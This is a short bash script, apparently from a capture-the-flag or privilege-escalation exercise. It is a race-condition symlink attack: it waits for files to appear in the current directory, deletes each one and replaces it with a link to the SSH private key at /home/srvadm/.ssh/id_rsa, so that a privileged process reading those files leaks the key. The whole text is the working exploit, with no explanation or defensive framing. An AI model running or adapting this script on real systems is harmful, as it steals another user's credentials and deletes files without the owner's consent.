#!/bin/bash

loop=1
while [ $loop -eq 1 ]
do
  files=`ls`
  for file in $files
  do
    sleep 0.01
    rm -f $file
    ln -s /home/srvadm/.ssh/id_rsa $file
    loop=0
  done
done

